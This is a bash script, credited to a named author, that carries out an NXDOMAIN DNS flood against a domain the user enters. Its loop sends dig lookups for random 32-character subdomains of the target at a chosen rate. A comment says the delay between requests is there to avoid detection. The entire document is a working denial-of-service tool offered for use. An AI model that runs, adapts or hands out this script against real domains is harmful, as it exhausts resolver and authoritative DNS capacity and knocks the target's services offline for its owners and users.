#!/bin/bash
### Description: The purpose of this script is to perform an NXDOMAIN attack against a target domain
### Author: Nicholas Doropoulos
### Date of Creation: 07/08/2021

###################
# VARIABLES SECTION
###################

i=0

############
# MAIN BODY
############

# Prompting the user for the target domain (i.e. example.com).
echo "Please type the apex domain of your target: "
read TARGET

# Prompting the user for the desired number of lookup requests against the target.
echo "Please type the number of iterations: "
read ITERATIONS

# Prompting the user for the desired number of seconds lapsed between requests.
echo "Please type the number of lapsed seconds between the requests: "
read LAPSED_SECONDS

# Carrying out the attack against the supplied target for the specified number of iterations.
while [ $i -lt $ITERATIONS ]
do
        dig `cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1`.$TARGET # Creating a random subdomain which is prepended to the target before performing the query.
        sleep $LAPSED_SECONDS # Adding a delay between lookup requests to avoid detection. Feel free to increment this value as per your use case.
        let "i++"
done

exit 0
